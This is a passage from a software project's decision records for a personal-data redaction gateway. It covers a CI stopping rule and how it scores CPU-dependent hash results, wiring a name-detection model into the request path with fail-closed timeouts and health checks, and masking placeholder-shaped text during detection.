   close-out (step 3) records E1 as not adopted and the condition as open,
   naming each counted model without a baseline. _Strength of claim:_
   unchanged; nothing is claimed that was not met. _Cost:_ the rule may
   never close; there is no designed end to the schedule except the
   project's end, and "open" is the permanent answer for every model seen
   once.
2. **A second exit for counted runs without progress.** An **addition**: a
   new exit beside the existing one; S2's adoption condition is untouched.
   For example: "If 20 counted runs pass and any counted CPU model still
   has no committed baseline, E1 is not adopted, the schedule stops or
   becomes weekly, and the question returns to the user", reusing the
   existing 20 so that no new number is chosen now. **(That example's
   wording was not adopted: the ruling below states the outcome alone and
   leaves what follows to a separate decision.)** (Folding the same
   condition into the existing 20-run exit instead would be an
   **amendment** to the original rule's exit, which S2 did not change.) A
   variant counts per model ("a counted model with no second run within N
   counted runs"), which needs a new number fixed now. _Strength of claim:_
   unchanged for adoption, which still requires everything; it adds a
   defined inconclusive outcome. _Cost:_ it may close the rule
   inconclusive where waiting longer would have succeeded.
3. **Scope the claim to the models that qualified.** An **amendment to
   S2**: "every counted CPU model has its baseline" is replaced by
   adoption for the models with baselines, the claim naming each counted
   model that did not qualify and what was and was not observed for it
   (its runs, whether its own second pass agreed, its hashes and which
   group they match; not whether it is deterministic across processes,
   and nothing checked against a baseline). _Strength of claim:_ weaker,
   and in a specific way. E1 runs the comparison on every push; on a
   model with no baseline it passes with a warning and checks nothing (the
   known unknown-CPU window). Adopting E1 under this option means an
   every-push check that is sometimes green without having verified
   anything: silent, in the sense the user used to rule out stripping
   (section 13 of ADR-041). Making such runs fail instead would make the
   check fail by host, which is what the rule exists to prevent.

**Not available:** steering runs to a missing model. GitHub does not choose
a runner's CPU on request (recorded above).

### Ruling (2026-10-10): the second exit (the user's decision: option 2, reusing the 20)

**This is an addition to the stopping rule, not an amendment to S2.** S2's
adoption condition is untouched: E1 is still adopted only when every one of
its conditions holds, every counted CPU model's committed baseline
included. The original 20-run exit stands beside it unchanged. Added:

> **If 20 counted runs pass while any counted CPU model still lacks a
> committed baseline, E1 is NOT adopted.**

That is the whole exit, and it is pre-registered. **It states an outcome;
it does not defer one.** What happens afterwards (whether the runs
continue, whether a narrower claim is written for the models that
qualified, or whether the question is abandoned) is a **separate project
decision, taken at that point**, and it cannot reopen this outcome. In
particular, this exit does **not** mean "the question returns to the
user" in the sense of "the user decides at 20 whether to adopt": if it
were read that way, the pre-registration would be worth nothing, since
the decision it fixes in advance would be made after the result, by
whoever is looking at it. At 20 counted runs with a counted model still
unbaselined, the answer to "is E1 adopted?" is already given: **no**.

**The timing, as reasoned before the ruling.** This was settled while
neither unbaselined counted model (the Xeon Platinum 8573C, last seen four
runs earlier; the EPYC 9V74, the day before) had visibly gone missing,
because once one has, any fix reads as motivated, however sensible.

### Open question, recorded and not acted on (2026-10-10): a run that verified nothing shows as a pass

Names #6 passed green in CI while verifying nothing: its CPU model has no
baseline, so the comparison had nothing to compare against, and its
results were withheld from the log (NEW CPU, exit 0, a warning annotation).
The condition "every counted CPU model has its baseline committed" exists
to keep the project from adopting a check that can pass vacuously, but
that behaviour is already live in the Names workflow today: a green tick
in the Actions list does not say whether anything was checked. **Whether a
run that verified nothing should look like a pass in the Actions list is a
separate question from the ruling above**, with its own costs (a failing
run on every new CPU would also be a failure by host). It is recorded
here; nothing was changed for it.

### Run #6's result against the committed prediction (opened 2026-10-10, after `93b6b90` was pushed)

Values as reported by the user from #6's `names-result.json`, opened only
after the prediction (`ef8b102`), the CPU-flags change (`2733d36`) and the
second exit (`93b6b90`) were committed and pushed. B's spans
`d1f611f06ea88b2feaa2bfdb5e8164bede8cafe8a905503e185b99f6f654bbfb`, names
`46dd8ff36336bbc80cf61571cb241d3074da08fd421686d7a18b0ee512f16777`, second
pass identical; 934 detections; R 502/612; main PERSON 145/153; precision
662/934; 152.5 ms per KiB; memory 375 MiB more after the model started,
455 MiB peak added. **The EPYC 9V74 is in the Xeon group** (group B: the
Xeon Platinum 8573C and Xeon 6973P-C); group A is the i5-12450H and EPYC
7763 (`96a5c328…`, `ba1a6b82…`).

**1. The prediction, scored.** Predicted: group B, **medium** confidence.
Result: group B, both hashes byte for byte. **A hit.** Its reasoning named
the mechanism the result is consistent with: the quantised model's
integer products are exact, so the difference more likely comes from the
floating-point kernels, which the runtime runs with AVX-512 on any CPU that
reports it, AMD included. Consistent with, not shown by: no run has looked
at which kernels were selected. Medium was the right confidence: the
prediction rested on an unobserved VM, an unsourced AMX fact (item 3) and
no kernel inspection, and one hit does not make any of those firmer.

**2. What this rules out.**

- **"Intel server chips" as the explanation.** Until now, group B was
  entirely Intel (two Xeons) and group A had the only AMD part. A vendor
  or product-line explanation fitted every result. **An AMD part in group
  B ends it**, and with the EPYC 7763 in group A, AMD is now in both
  groups. **This is the strongest thing this result does.**
- **"AMX decides."** Group B now contains a CPU without AMX (item 3 for how
  firm that is), so AMX is not needed to be in group B.
- **Per-CPU-model variation.** Five CPU models, still two groups: a fifth
  CPU joined an existing group rather than producing a third pair of
  hashes.

**3. What it does not establish, and the row it rests on.** The conclusion
"AVX-512 decides, not AMX" rests on the 9V74 having no AMX, which the
prediction's verification marked "inferred, not sourced". That row is now
load-bearing, so it was checked again (2026-10-10, after the result was
opened; it could not change the prediction):

- **Sourced, from the compiler's documentation.** GCC's x86 options page
  (`gcc.gnu.org/onlinedocs/gcc/x86-Options.html`) gives the full extension
  set for `-march=znver4` (AMD Family 19h, Zen 4): BMI, BMI2, CLWB, F16C,
  FMA, FSGSBASE, AVX, AVX2, ADCX, RDSEED, MWAITX, SHA, CLZERO, AES, PCLMUL,
  CX16, MOVBE, MMX, SSE to SSE4.2 and SSE4A, ABM, XSAVEC, XSAVES,
  CLFLUSHOPT, POPCNT, RDPID, WBNOINVD, PKU, VPCLMULQDQ, VAES, AVX512F,
  AVX512DQ, AVX512IFMA, AVX512CD, AVX512BW, AVX512VL, AVX512BF16,
  AVX512VBMI, AVX512VBMI2, AVX512VNNI, AVX512BITALG, AVX512VPOPCNTDQ and
  GFNI: **no AMX-TILE, AMX-INT8 or AMX-BF16**. Its `sapphirerapids` entry
  (Sapphire Rapids / Emerald Rapids, the 8573C's family) lists all three.
  Its `znver3` entry (the EPYC 7763's family) lists AVX2 and no AVX-512.
- **Limits.** This is GCC's documented model of the family (what it
  enables when targeting it), not AMD's own specification; it is about
  Zen 4 generally, not the 9V74 part, whose Zen 4 identity rests on the
  sources recorded with the prediction; and the page came through a fetch
  tool whose own summary misread the list (it called AVX512BF16 an AMX
  extension). The verbatim list was read, not the summary.
- **Still not established:** that AVX-512 is the cause. The two groups
  split by AVX-512 on all five CPUs, but no run has looked at which kernels
  were selected, and AVX-512 is not the only thing the groups differ in.
  "AVX-512 decides" is the hypothesis that fits all five results, not a
  finding.

**4. The concrete difference.** Group B finds **one detection more** than
group A (934 against 933), and that one counts as a **true positive on
both measures**: recall 502 against 501 of 612, precision 662 against 661,
false positives unchanged, main PERSON 145 of 153 in both. By these counts
the groups differ by one name, found by B and missed by A. The counts
cannot show whether the span sets also differ in ways that leave every
count equal (a boundary moved within a name, say); the names hash says
only that they differ. Which name it is was not looked at (texts are never
printed).

**5. Speed, as weak corroboration.** Group B runs sit near 150 ms per KiB:
#2 (Xeon Platinum 8573C) 147.0, #6 (EPYC 9V74) 152.5. Group A's runner
runs sit near 293: #1, #3, #5 (EPYC 7763) 292.1, 293.0, 294.5. So speed
separates the same two groups by a measurement independent of the hashes.
**Weak, not proof:** clock speed, core design, memory and host generation
differ between these machines too, and AVX-512 is one plausible cause of
the speed among several. The Xeon 6973P-C's speed (#4) is not recorded in
this repository (#4's log may hold it).

**6. The VM and AVX-512: evidence, not observation.** #6 never printed its
flags (the change in `2733d36` came after it), so "the VM exposed AVX-512
to the guest" is still unobserved. The result is **consistent** with it:
under the hypothesis, a 9V74 VM that hid AVX-512 would have landed in group
A. That is evidence from the result, not an observation of the guest. The
next 9V74 run prints its flags.

**7. Tally and what is outstanding.** Opening the artifact changes no
count: **5 of 10 counted**, on three CPU models: EPYC 7763 3 (confirmed
baseline), Xeon Platinum 8573C 1, EPYC 9V74 1. Outstanding, at minimum:

- **EPYC 9V74:** one more counted run whose two hashes and every measured
  field equal #6's, for its baseline (the minting rule: two agreeing runs,
  not one; knowing its group does not substitute for the second run). That
  run will also print its flags.
- **Xeon Platinum 8573C:** two counted runs with their own second pass that
  agree (#2 predates C3), which also gives a second model three runs.
- **Two more counted runs** on any model with a baseline, to reach 10.
- Every counted run on a further new model adds at least one more
  required run on that model; and the second exit stands: at 20 counted
  runs with any counted model still unbaselined, E1 is not adopted.

<a id="adr-037"></a>

## ADR-037: Person names in the request path, against a fake model (Phase 6b step 3, 2026-10-03; amends ADR-003, ADR-013)

**Status.** Built and tested in step 3. Decisions marked "the user" were
settled before or during the step; those marked "this ADR" were made while
building and are reported for review. No real model, no worker and no
runtime yet (step 4); nothing installed. **Step 4b (2026-10-07):** the
real model, in a worker thread, behind the same contract; amendment at the
end of this ADR, with the timeout and queue defaults (provisional) and the
open question of stopping a long call.

**Context.** ADR-035 chose B+F behind `PSEUDONYM_NAMES`, off by default;
ADR-036 settled how the runtime, model and list reach a machine and the
fail-closed rules. Step 3 wires names into the request path with a fake
model in B's place, so that everything except inference is real and
tested before the model arrives.

### Decided before building (the user)

- **Coordinates, option 3.** The name finder reads the original text (as
  6a measured it). `NormalisedText.toNormalised` brings each span into
  `detect()`'s normalised text. It reads the same offset arrays as
  `toOriginal` (no separately computed inverse), rounds outwards to whole
  clusters, and gives nothing for a span of invisible characters only.
  PERSON is then resolved with every other type, and `toOriginal` maps it
  back.
- **PERSON is never validated**, and comes after every pattern type:
  `… > EMAIL > SECRET > PERSON > NUMBER` (**ADR-003 amendment**).
- **Threading:** `detect(original, names?)`, `redactMessage(text, mapping,
names?)`, `redactRequest(request, mapping, {…, names?})`. Names are found
  once per request, before redaction, on `requestTexts(request)`: the
  texts in exactly the order `redactRequest` redacts them. Each text's
  names carry that text; `redactMessage` throws `NameTextMismatchError` (a 500) for any other text, and `redactRequest` for a different number of
  entries.
- **Option 2 for a name cut short at an invisible character** (ADR-036):
  `extendOverInvisibles` in `src/detection/names/find.ts`, after the join.
- **PERSON in the one type list (option A of this step).** It is in
  `DETECTION_TYPES`, so the placeholder grammar knows it everywhere. The
  one names-off change, accepted by the user: text already shaped like a
  PERSON placeholder (`[PERSON_1]`, `[person 2]`) becomes a LITERAL and is
  restored byte for byte, as ADR-002 always intended (**ADR-013
  amendment**: PERSON has no bare-space form, like every namespace but
  AADHAAR and LITERAL). The only existing test edited is the pinned type
  list in `overlap.test.ts`.
- **`GET /health`**: 200 `{"status":"ok"}`, or 503 `{"status":"unhealthy"}`
  once the name model has crashed. Names off: always ok.

### The request path with names on

`buildServer`'s `config.names`, absent with names off. In the handler,
after parsing and the model check and before the mapping exists:
`names.find(requestTexts(chat), signal)`; a failure is a 503 before the
provider is called, for streaming too. The finder is `NameDetector`
(`src/gateway/names.ts`): the model's answer is checked (`modelSpans`),
then the measured path runs unchanged in its moved code (`detectionsAt` at
0.9 / 0.6 and at `NO_SCORE`, `joinDetections`), then option 2.

**Fail closed (ADR-036, as built).** The model works on one request at a
time; at most `maxQueue` wait; `timeoutMs` covers waiting and running
together. Every failure is `NameDetectionUnavailable`: 503, code
`name_detection_unavailable`, one fixed message, the reason in the logs
only (`queue_full`, `timeout`, `failed` for a model that rejected or threw,
`malformed`, `crashed`, `aborted` for a client that left).

Decided by this ADR:

- A request that times out while the model works on it stops waiting, but
  the next request starts only when the model has finished: the model
  cannot be interrupted, and freeing its slot early would let work pile up
  behind it.
- A model call that fails is a 503 for that request only; the detector
  stays healthy. Only a crash (the model's `onCrash`; in step 4, the
  worker's exit) is permanent. ~~So a model that hangs for ever keeps
  health "ok" while every request times out or finds the queue full.~~
  **Superseded by the amendment below:** a model held past the timeout
  makes health unhealthy until the call ends. Step 4 decides whether a
  timed-out worker is terminated, which would make it a crash.
- `timeoutMs` and `maxQueue` have no defaults: step 4 sets them from its
  measurements. Until then `main.ts` refuses to start with names on
  (`NAME_MODEL_LOAD_FAILED`), through the same `nameFinder` wiring step 4
  will use. With names off `nameFinder` never calls its start function,
  and nothing `main.ts` loads statically reaches a name module (tested by
  walking the static imports).
- `PSEUDONYM_NAMES` is `"true"` or `"false"` with no default, absent from
  the parsed configuration unless set, so that a names-off configuration
  is exactly the one from before names existed.
- The name list is checked at start-up against `NAME_LIST_SHA256`
  (ADR-036's canonical hash) before the model is loaded, and the detector
  uses the very list it checked.

### What the model may answer (decided by this ADR)

The answer is untrusted: in step 4 it comes from a worker.

| Answer                                                                            | What happens                                                                            |
| --------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| Not one list per text; a list that is not an array; a span that is not an object  | **Refused** (503, `malformed`)                                                          |
| An offset past the end, negative, not an integer or not a number; start after end | **Refused**                                                                             |
| A score outside [0, 1] or not a number                                            | **Refused**                                                                             |
| More spans than the text has UTF-16 code units                                    | **Refused** (B gives at most one per word; this bounds the work)                        |
| A span with no characters (start = end)                                           | **Discarded**: it claims nothing, and widening it would invent a name around a position |
| Overlapping spans; spans out of order                                             | **Kept**, joined as the measured path joins them                                        |
| A span over the whole message                                                     | **Kept**: the whole message becomes one PERSON placeholder (over-redaction, not a leak) |
| Several thousand spans                                                            | **Kept** (tested: 3,000 overlapping spans on a 6.8 KB message)                          |
| An edge inside a surrogate pair or a cluster                                      | **Kept**, rounded out to the whole character                                            |

Refused because a broken answer cannot say which part of the text it
meant, so nothing can say what it left visible.

### Inside `detect()` and `redactMessage()` with names (decided by this ADR, from what the tests found)

- **A PERSON span is widened to the whole token** it touches (letters,
  digits, marks, underscores) and to the digit runs that token reaches,
  repeatedly. The finder already gives whole words; this keeps a span on
  part of a word from leaving the rest visible, or from cutting digits out
  of a token the safety net would have taken whole (found by the "nothing
  another detector claimed is uncovered" property). It only ever redacts
  more: `asha_rao92` goes as one placeholder.
- **A name span over a literal is cut around it** (`outsideLiterals`),
  trimmed to a letter or digit at each cut, and a PERSON detection that
  still overlaps a literal after rounding is cut again, never dropped.
  Other types are still dropped whole: bug-log 58.
- **With names on, the last overlap pass cuts instead of dropping**
  (`resolveRounded`, bug-log 59), for every type: rounding to clusters can
  make two neighbours share a character, and a name can be lost in a clash
  it is not part of. Names off keeps the plain rule.
- **PERSON value key:** the normalised text, lower case, whitespace
  collapsed. `Asha Rao` and `ASHA  RAO` are one value; `Asha` and
  `Asha Rao` are two (the Phase 6 decision).

**Two behaviours by configuration, on purpose and for now.** With names
off, a detection that overlaps a literal, or that shares a character with
a neighbour after rounding, is dropped whole, as before; with names on it
is cut. Both are to be unified when bug 58 is decided. **Unified the same
day** (below, "Bug 58 fixed"): every request cuts, names on or off.

### Proof (step 3)

Names off: every existing test file passes (with the one approved edit),
`npm run eval` matches the baseline, the finder's start function is never
called, and no name module is in `main.ts`'s static import closure. Names
on, with the fake model: the per-offset round-trip property of
`toNormalised` (three properties, 2,000 runs each); exact outputs for a
Devanagari name after a precomposed nukta letter, a full-width name, a
zero-width space, zero-width joiner, soft hyphen and word joiner inside a
name, an invisible character at a name's edge, and U+FDFA, ½, Hangul
jamo, full-width and Devanagari digits before it; the coverage properties
(3,000 runs each); no-leak on the mock provider's raw bytes (60 requests,
540 names, each also checked word by word), with every name restored;
every failure path a 503 with the provider never called and no name in
the response, the logs or the handled errors; PERSON placeholders restored
in an SSE reply cut at every position, one character at a time, and at
random cuts biased into placeholders. 100% coverage of `src` and `eval`.

### Corrections found on the way

- **ADR-013's literal-overlap filter is reachable** (bug-log 58). ADR-024,
  ADR-025 and ADR-026 each say it "stays unreachable"; those sentences are
  wrong, and mutation M9 was misjudged. Recorded here, not edited in place.
- **Every other mutant recorded as equivalent was re-checked** against
  today's code, with names on, and holds: `docs/testing-guide.md`, "Every
  mutant called equivalent or unreachable, re-examined (2026-10-03)".

### Consequences

Names on still refuses to start until step 4 adds the model loader, the
worker and measured values for `timeoutMs` and `maxQueue`. The README and
the user manual describe names as wired but not available yet. Bug 58's
options are with the user; deciding it also decides bug 59's names-off
rule.

### Amendment after step 3 (2026-10-03, the user's review)

**Health reflects the ability to serve, not only the absence of a crash
(decided by the user, rule proposed here).** A model that hangs used to
leave health "ok" while every request got a 503. Rule: `healthy` is false
once the model has crashed (permanent, until the process restarts), **and
while the model is held by a call that has run longer than `timeoutMs`**.
Such a call's own request has already been refused, nothing else can run
until it ends, so every request meanwhile times out or finds the queue
full. Health is true again when the call ends. A full queue behind a model
that still answers in time stays healthy: that is load, and each refused
request already gets its 503. Whether a held call is interrupted (which
would make it a crash) stays a step 4 question. Tested in
`test/unit/gateway/names.test.ts` and through `GET /health`.

**The token widening, measured on the unmodified generated set.** B's
saved 6a spans (`2026-10-03-join-after`, generated set only) through the
real finder path (933 name detections, exactly D0's count, so the spans
line up), `detect()` with the token widening against a copy without it
(PERSON widened only to digit runs, like every type): **11 of 1,998
messages have more redacted, 64 more characters (57 visible), none less.**

| What the widening added                                                                                     | Messages | Characters       |
| ----------------------------------------------------------------------------------------------------------- | -------- | ---------------- |
| Digits glued after letters B called a name, in a labelled **passport (3) or voter ID (1)**: sent without it | 4        | 35 (7 invisible) |
| The same in a labelled lookalike (product code, batch, ticket code, SKU)                                    | 4        | 26               |
| A validated IFSC (2) or a keyword secret (1) the model's span reached into, taken into the name             | 3        | 3 (a space each) |

So it is not zero. In 4 messages it closes a partial leak of a real value
(the model took the letters of a passport or voter number as a name, and
the digits glued to them went out); in 4 it over-redacts a code; in 3 a
value keeps being redacted but is typed PERSON instead of IFSC or SECRET,
with the space between them. Recorded, not changed.

**Which form comes back when one name is written several ways.** One
value key per name (case, spacing, full width and invisible characters
ignored), so one placeholder, and it restores to **the first form written
in the request**, in `requestTexts` order (messages, then stop sequences):
`ASHA RAO` first, then `Asha Rao` later, and both places come back as
`ASHA RAO`. So it can restore a form that was not at that position, but
never a form the request did not contain: the value is a verbatim slice
of the text where the name was first seen. This is ADR-013's rule for
every type; for names it is tested by the property "every placeholder
restores the first form written, a verbatim slice of the request, in every
later place" (`redact-names.test.ts`), and the echo measurement counts it
as "back with a later mention as first written".

### Bug 58 fixed (2026-10-03, its own commit; the user chose option 1 with bug 59's rule)

- **Every detection that overlaps a literal is cut around it, never
  dropped** (`redactMessage`, `outsideLiterals`); the PERSON-only cut
  above is now the rule for every type.
- **The last overlap pass cuts for every request** (`resolveRounded`),
  names on or off.
- Names-off output changes only where a value used to be sent: measured
  before the fix on 100,000 random texts, 9,089 (option 1) and 1,215 (bug
  59's rule) changed, each one text the old code sent and the fix redacts.
- **The evaluation did not move:** every count, generated and held-out,
  scores and echo, matched the baseline; `baseline.json` and the README
  block are unchanged. Held-out counts had been permitted to move (a
  correctness fix from the generated set and the step 3 properties, no
  held-out case involved; bug-log 58), and none did.
- Corrections marked "fixed" at ADR-013, ADR-024, ADR-025 and ADR-026.

### Amendment after the bug 58 fix (2026-10-03, the user's review)

**The token widening stops at a validated value (the user's decision).**
An unvalidated guess must not absorb a checksum-verified value: the same
rule the overlap resolver applies (ADR-003 rule 1). `widenName` never grows
into the span of a validated candidate; what the model's own span already
covers of one is left to the resolver, which gives it to the validated
value. Names are now added to the candidates after the detectors run, so
that the widening knows them. Re-measured on the generated set (same
method as the amendment above): **9 messages, 62 characters more, none
less** (was 11 and 64). The validated IFSC and the AWS-format key (message
338: my earlier report called it a keyword secret; it is a validated
known-format key) are no longer taken into the name. **One retyping
stays:** an IFSC at a bank code not on the list, accepted only by its
keyword, is not validated, so the rule does not apply to it. The 4
passport and voter values stay fully redacted (bug-log 60), the 4
lookalike codes stay over-redacted. A name span reaching into a published
test card now gives `[PERSON_1] [CARD_1]`, not `[PERSON_1]`.

**Which form comes back is the same rule for every type.** One placeholder
per value key, restored to the first form written (`mapping.ts`), for
emails, PANs, cards, UPI IDs, IP addresses and dates of birth as for names
(probed for each). The exception is SECRET, whose value key keeps case, so
two spellings are two values and each comes back as written.
`variants.ts` plays no part: it decides which placeholder spellings are
recognised, not which value they restore to. The user manual says so in
one line.

**The generated set gains a `glued-literal` shape: 108 cases, one value
each** (SECRET 24, NUMBER 18, PHONE 18, AADHAAR 12, CARD 12, EMAIL 12, UPI
6, IP 6), from 18 templates covering every way bug 58 let a value through:
digits joined across the literal's `]` before and after it, through a
joiner (`-`, `.`, brackets), from values that pass their check and values
that fail it; a keyword secret whose value runs over the literal; a
combining mark between the literal and an address; a known-format key
glued to it. Eight literal spellings (`[PAN_1]`, `[CARD_2]`, `[pan 1]`,
`[LITERAL_1]`, `[PERSON_3]`, `[Aadhaar 2]`, `[EMAIL_1]`, `[number_4]`),
by case number, so each template meets four, one with a space. A value
only found with a keyword (a card that fails its check, a UPI ID at an
unknown handle) gets one, so that the literal is the only difference.
Accepted as a changed dataset, detectors unchanged; `baseline.json` holds
two history entries for it, the first draft of the cases and then the
corrected templates (over-redactions 35 to 41), both with this ADR's note.

Measured on scratch copies (generated set only):

| On the 108 values                                    | Today | With bug 58 put back |
| ---------------------------------------------------- | ----- | -------------------- |
| Values sent whole (`redactMessage`)                  | 3     | 46                   |
| Echo: placeholders restored (pinned by the baseline) | 222   | 179                  |
| Scores (`detect()`): redacted                        | 105   | 105                  |

So **the eval now fails if bug 58 comes back, through the echo**, whose
"restored" count may only go up. The scores cannot see it: they read
`detect()`, which never had the literal filter. The 3 values sent today
are bug-log 61 (not fixed). The shape's 41 over-redactions are 32
detections wholly inside a literal (the safety net reading the literal's
digit as joined to the value; the text sent keeps the literal there) and
9 filler lookalikes. **Open, for the user:** the scores measure what
`detect()` finds, not what is sent; scoring the text `redactMessage`
sends would make the leak counts themselves see this class of bug.

### Amendment, Phase 6b step 4b (2026-10-07): the real model behind the same contract

**The fake's contract holds against the real worker.** `NameDetector` is
unchanged; the worker (`WorkerNameModel`, ADR-036 "Step 4b") implements
the same `NameModel` the fake did. Held by tests, with the provider
asserted never called on every refusal:

- the main suite, on real worker threads with a scripted stand-in for B
  (`test/unit/gateway/name-worker.test.ts`): answers matched by id with
  calls in flight at once, a thread's answer passed on unchecked and then
  refused by the detector (`malformed`), "failed" answers with a fixed
  message, stray replies ignored, a thread that exits is a crash (503s,
  unhealthy, no restart), a thread that never answers times out with
  health held, and start-up refused for a thread that fails to load,
  exits, sends something else first or never says it is ready;
- the names project, with B itself (`npm run test:names`,
  `test/integration/names-worker.names.test.ts`): no name the model found
  is sent; concurrent requests each get their own names; a call past the
  timeout is a 503, health is unhealthy while B is still on it, and the
  thread serves again when it ends; a full queue is refused at once while
  the request ahead completes; seven kinds of garbage made from B's real
  answers (offset past the end, negative, start after end, a score that is
  not a number, above 1, one list too many, not a list) are each refused,
  and the same answer uncorrupted goes through; a thread that exits makes
  every request a 503 and health unhealthy.

**The timeout and the queue.**
`PSEUDONYM_NAMES_TIMEOUT_MS` and `PSEUDONYM_NAMES_MAX_QUEUE`, optional and
absent from the parsed configuration unless set, like `PSEUDONYM_NAMES`;
`nameOptions()` (wiring.ts) applies the defaults, so a names-off
configuration is still exactly the one from before names existed (the env
test caught a first draft that defaulted them in the schema). A first
draft of this amendment proposed 120 s, the provider timeout's default:
about 1.4 times the gateway's own measured worst case, but below the 134.6 s
the slowest measured run would need for a full body, so a legitimate
maximum-size request would have been refused on a slow run. **Replaced, at
the user's request, by a derived value:**

- **Timeout 202,000 ms, derived.** The slowest name-detection throughput
  ever measured on a full 256 KiB body is **525.889 ms per KiB** (B 524.319
  - F 1.570, the comparison script's run of 2026-10-03,
    `D:\pseudonym-6a\runs\2026-10-03-move-after`). Every other full-body
    run: the script 275.0–442.1 (six runs) and the gateway 287.7–331.9 (four
    runs). The largest request the default body limit allows carries at most
    256 KiB of text, so at that speed it takes **134.6 s**. **Margin 1.5**:
    the gateway's path was up to 1.21 times the script's in the one session
    that measured both, so a gateway run as slow as the slowest script run
    would take about 163 s; 1.5 covers that with room left. 134.6 × 1.5 =
    201.9 s, rounded up to the second: **202 s**. The derivation is the code
    that computes it (`NAMES_TIMEOUT_MS_DEFAULT`, wiring.ts), with these
    numbers beside it. The timeout counts waiting in the queue too, so a
    request behind a large one can still be refused for the time the large
    one takes.
- **Queue 8, chosen, not derived.** It bounds how many requests wait while
  the model works on another, and so the memory they hold (bodies the
  gateway has already parsed: at most 256 KiB of text each, about 2 MiB for
  eight) and how many are told "wait" instead of refused at once. It does
  not bound how long they wait; the timeout does. At the measured 1 KiB
  and 4 KiB latencies (141–148 ms, 1.06–1.16 s), eight chat-sized requests
  wait about 9 s at most together, well inside the timeout.

**Should a call that runs past its timeout be stopped? Decided by the
user (2026-10-07): option 1, never.** Step 3 left it to this step: a worker thread can be stopped,
which an in-process fake could not. This step found that it cannot be
stopped safely (bug-log 68): stopping the thread during an inference ends
the whole process, and the runtime has no cancel for a native run.
Options, with the user:

1. **Never stop it (as built).** The request is refused at its timeout;
   the model finishes the call; the next request starts after it. Queue:
   requests behind it wait, each refused at its own timeout, or at once if
   the queue is full. Health: unhealthy while the call runs past the
   timeout, ok when it ends; if it never ends, unhealthy until the process
   is restarted from outside. A request already waiting runs if the call
   ends before its own deadline, else gets a 503.
2. **Declare it a crash after a limit, without stopping it.** Past a hard
   limit (longer than the timeout), the detector marks itself crashed, as
   for a thread that exited; the thread is left to finish and its answer
   ignored. Queue: every waiting request refused at once. Health:
   unhealthy for good, until a restart. A request already waiting: a 503
   at the limit at the latest. Costs one rule and one number; a slow but
   legitimate call past the limit disables names until a restart.
3. **Stop the thread after a limit.** On this machine that ends the
   gateway process at once (0xC0000409). Queue: gone. Health: no answer.
   A request already waiting, and every other request in flight
   (names-off traffic, streams already flowing), loses its connection
   instead of getting a 503. Recovery only through an outside restart.
4. **Run the model in a child process instead of a thread, and kill it
   after a limit.** Killing a process is safe; counted as a crash
   (permanent, ADR-036). Queue: refused at once; health unhealthy for
   good; a waiting request gets a 503 at the kill. Costs: this step's
   channel rebuilt for a process, a second Node process's memory, and the
   span proof, the names tests and the names-off proof run again.

**Recommendation: 1.** No option stops a run inside the thread safely,
and a run's length is bounded by the 256 KiB body limit, so a call past
the timeout is almost always a large request that will finish, after
which 1 recovers on its own; health already reports the hold, so an
orchestrator can restart on a sustained "unhealthy". If a definite
cut-off is wanted, 2 gives it without risking the process. 4 only if
stopping the work itself matters.

**Decision (the user, 2026-10-07): option 1, as built and as recommended.**
Nothing was implemented for it; it is the behaviour step 3 built.

**What option 1 depends on: the body limit.** It is safe only because a
call's length is bounded: the model's work grows with the text, and the
text is bounded by `PSEUDONYM_MAX_BODY_BYTES` (256 KiB by default,
ADR-015), so a call past its timeout is a large request that finishes
within about 79–135 s as measured, after which the detector recovers by
itself. **Option 1 holds while the body limit bounds call length.** The
names timeout is derived from the same limit (above). Raising the body
limit therefore changes two names decisions at once: calls can run for
longer than anyone measured, with nothing able to stop them, and the
derived timeout no longer covers the largest request. **If the body limit
is ever raised, option 4, the model in a child process that can be
killed, is the right answer**, with the span proof, the names tests and
the names-off proof run again, and the timeout derived again. So that
someone relaxing the limit finds this out: the comment at
`PSEUDONYM_MAX_BODY_BYTES` in `src/config/env.ts`, the comment at
`NAMES_TIMEOUT_MS_DEFAULT` in `src/config/wiring.ts` and
`.env.example` all say so and point here.

<a id="adr-038"></a>

## ADR-038: Detection never reads placeholder-shaped text, and the evaluation counts what is sent (2026-10-03; bug-logs 58 and 61)

**Status.** **Reversed on 2026-10-07** (the final amendment at the end of
this entry): the masking is undone, detection is the code of 9ec51b7
again, and bug 61 is a known limitation. Part 2 (counting what is sent)
was never started here; it is ADR-040. Everything below the reversal is
kept as the record of why. Originally: decided by the user (bug-log 61,
option 2; and the scoring question left open in ADR-037). This entry is
written in two parts: the plan and its guard first, before any
measurement; the results after.

### Part 1: detection reads no literal (bug-log 61, option 2)

**Decision.** `redactMessage` runs `detect()` on the text with every
literal (placeholder-shaped text, ADR-002) replaced, code unit for code
unit, by a filler character, so offsets do not move. The hole is not in
one detector but in letting any detector read placeholder text: the
keyword secret took `[pan` as its value (bug 61), the safety net joined
the literal's digit to the value next to it, and a literal such as
`[Aadhaar 2]` could supply the keyword another type needs. Patching the
secret detector alone would leave the others to be found one at a time.

**The filler: U+2591 `░`** (Symbol, Other). Not a letter, digit or mark,
so it is never glue or part of a token; in no detector's alphabet (email
local part, UPI name, IP, JWT and base64url, digit runs and the safety
net's joiners); not blank, so it does not join spaced digits or end a
line; not invisible (normalisation would remove it and glue its
neighbours); unchanged by NFKC; it cannot form a value or a keyword.

**Guard, fixed before measuring (the user's).** If any generated count
outside the `glued-literal` shape moves, or any restoration behaviour
changes (a restoration test, or an echo count outside that shape), stop
and report instead of going on: the change alters the detection input of
every request, so an unrelated count moving means it did more than
intended.

**Whether it replaces bug 58's cut-around rule:** to be measured. A
keyword secret's value runs to the next blank, filler included, and a
mark after a literal shares the filler's cluster, so some detections may
still reach into a literal's positions; name spans come from outside
`detect()`.

**Result (2026-10-03): built, guard passed, stopped for a decision.** The
guard's two conditions held (only the `glued-literal` echo moved, 222 to
225; every test passed). But masking hides keywords the user wrote: a
value found only with a keyword, whose only keyword is inside a
placeholder-shaped text, is now sent (1,200 of 1,200 probed; bug-log 61
follow-up). And it does not replace the cut-around: keyword secret values
and combining marks still reach into a literal's positions. Part 2 not
started.

**Part 1 as built (2026-10-03, the user's option 1: mask the values, keep
the keywords).** `detect(original, names, hidden)` takes the literal spans
and builds the masked copy itself (`maskSpans`). **Values are matched in
the masked copy; the keyword check (`hasContext`, the only keyword check
outside a detector's own pattern) reads the original**, at the same
offsets. The correspondence is structural, not hoped for: `maskSpans`
changes one code unit for one and `checkMasked` verifies its output (the
same length; every position that differs is inside a span and holds the
filler), and `checkAligned` verifies that the two normalisations have the
same offset map, which holds because a literal's characters normalise one
